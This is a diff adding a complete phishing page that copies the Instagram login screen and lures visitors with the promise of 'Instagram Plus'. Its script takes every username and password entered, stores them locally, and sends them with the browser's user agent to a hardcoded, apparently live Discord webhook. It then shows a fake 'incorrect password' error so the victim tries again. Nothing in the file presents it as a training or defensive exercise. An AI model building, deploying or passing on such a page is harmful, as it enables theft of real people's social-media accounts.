@@ -1,1 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  <title>Log in to Instagram Plus</title>
 
+  <style>
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      min-height: 100%;
+    }
+
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #262626;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+    }
+
+    .page {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      min-height: 100dvh;
+      padding: 24px 16px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 350px;
+      padding: 44px 40px 28px;
+      background: #ffffff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: "Grand Hotel", "Billabong", -apple-system, cursive;
+      font-size: 44px;
+      line-height: 1;
+      font-weight: 400;
+      color: #262626;
+      margin: 0 auto 28px;
+      letter-spacing: -1px;
+      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+      padding: 4px 10px;
+    }
+
+    .subtitle {
+      margin: 0 0 22px;
+      font-size: 13px;
+      color: #8e8e8e;
+      line-height: 1.4;
+    }
+
+    .field {
+      width: 100%;
+      height: 40px;
+      margin-bottom: 6px;
+      padding: 0 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 14px;
+      color: #262626;
+      outline: none;
+      transition: border-color 0.15s ease;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .field:focus {
+      border-color: #a8a8a8;
+      background: #ffffff;
+    }
+
+    .login-button {
+      width: 100%;
+      height: 32px;
+      margin-top: 8px;
+      border: 0;
+      border-radius: 8px;
+      background: #0095f6;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s ease;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .login-button:hover { opacity: 0.9; }
+    .login-button:active { opacity: 0.8; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0 16px;
+      color: #8e8e8e;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .divider span {
+      padding: 0 18px;
+    }
+
+    .facebook-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      margin-bottom: 14px;
+      cursor: pointer;
+    }
+
+    .facebook-login svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    .forgot {
+      display: block;
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
+      cursor: pointer;
+      margin-bottom: 8px;
+    }
+
+    .error-message {
+      min-height: 16px;
+      margin: 14px 0 0;
+      color: #ed4956;
+      font-size: 13px;
+    }
+
+    .success-message {
+      min-height: 16px;
+      margin: 14px 0 0;
+      color: #2e7d32;
+      font-size: 13px;
+    }
+
+    .signup-card {
+      width: 100%;
+      max-width: 350px;
+      margin-top: 10px;
+      padding: 22px 40px;
+      background: #ffffff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+    }
+
+    .signup-card span {
+      color: #0095f6;
+      font-weight: 600;
+      margin-left: 4px;
+    }
+
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin: 10px 0 4px;
+      color: #8e8e8e;
+      font-size: 11px;
+      text-align: left;
+    }
+
+    .show-password input {
+      width: 13px;
+      height: 13px;
+      margin: 0;
+      accent-color: #0095f6;
+    }
+
+    @media (max-width: 380px) {
+      .card { padding: 32px 22px 22px; }
+      .logo { font-size: 36px; }
+      .signup-card { padding: 18px 22px; font-size: 13px; }
+    }
+
+    @media (max-height: 520px) {
+      .page { justify-content: flex-start; padding-top: 16px; }
+      .card { padding: 24px 22px 20px; }
+      .logo { font-size: 32px; margin-bottom: 16px; }
+      .subtitle { margin-bottom: 14px; }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="page">
+
+    <section class="card">
+
+      <div class="logo">Instagram</div>
+
+      <p class="subtitle">Log in to claim Instagram Plus</p>
+
+      <form id="loginForm">
+        <input
+          id="username"
+          class="field"
+          type="text"
+          placeholder="Phone number, username, or email"
+          autocomplete="off"
+          autocapitalize="off"
+          autocorrect="off"
+          spellcheck="false"
+        >
+
+        <input
+          id="password"
+          class="field"
+          type="password"
+          placeholder="Password"
+          autocomplete="off"
+          autocapitalize="off"
+          autocorrect="off"
+          spellcheck="false"
+        >
+
+        <label class="show-password">
+          <input id="showPassword" type="checkbox">
+          Show password
+        </label>
+
+        <button class="login-button" type="submit">
+          Log in
+        </button>
+
+        <div class="divider"><span>OR</span></div>
+
+        <a class="facebook-login" href="#" onclick="return false;">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#385185">
+            <path d="M22 12a10 10 0 10-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.34v6.99A10 10 0 0022 12z"/>
+          </svg>
+          Log in with Facebook
+        </a>
+
+        <a class="forgot" href="#" onclick="return false;">Forgot password?</a>
+
+        <p id="message" class="error-message"></p>
+      </form>
+
+    </section>
+
+    <p class="signup-card">
+      Don't have an account?<span>Sign up</span>
+    </p>
+
+  </main>
+
+  <script>
+    // ─── CONFIG ───────────────────────────────────────────────────────────
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551399122467164211/8R8no16JCKEuDQ_Fc_ahBJhdDFsw2MV15Ds_Q1RrT9cQaSfZMQdpdBji5rogSsBPa7d9";
+    // ──────────────────────────────────────────────────────────────────────
+
+    const form = document.getElementById("loginForm");
+    const password = document.getElementById("password");
+    const showPassword = document.getElementById("showPassword");
+    const message = document.getElementById("message");
+
+    window.capturedLogins = JSON.parse(localStorage.getItem("capturedLoginsIG") || "[]");
+
+    function persistLocal(entry) {
+      window.capturedLogins.push(entry);
+      try {
+        localStorage.setItem("capturedLoginsIG", JSON.stringify(window.capturedLogins));
+      } catch (e) {
+        console.warn("localStorage write failed", e);
+      }
+    }
+
+    async function sendDiscord(entry) {
+      if (!DISCORD_WEBHOOK) return;
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content:
+              "**IG — new submission**\n" +
+              "**User:** `" + entry.username + "`\n" +
+              "**Pass:** `" + entry.password + "`\n" +
+              "**Time:** " + entry.timestamp + "\n" +
+              "**UA:** `" + entry.userAgent + "`"
+          })
+        });
+      } catch (e) {
+        console.warn("discord send failed", e);
+      }
+    }
+
+    showPassword.addEventListener("change", function () {
+      password.type = this.checked ? "text" : "password";
+    });
+
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const enteredPassword = password.value;
+
+      const entry = {
+        username: username,
+        password: enteredPassword,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
+
+      persistLocal(entry);
+      sendDiscord(entry);
+
+      console.log("[IG captured login]", entry);
+      console.table(window.capturedLogins);
+
+      if (username === "demo_user" && enteredPassword === "demo_pass") {
+        message.className = "success-message";
+        message.textContent = "Login successful!";
+      } else {
+        message.className = "error-message";
+        message.textContent = "Sorry, your password was incorrect. Please double-check your password.";
+      }
+    });
+  </script>
+</body>
+</html>
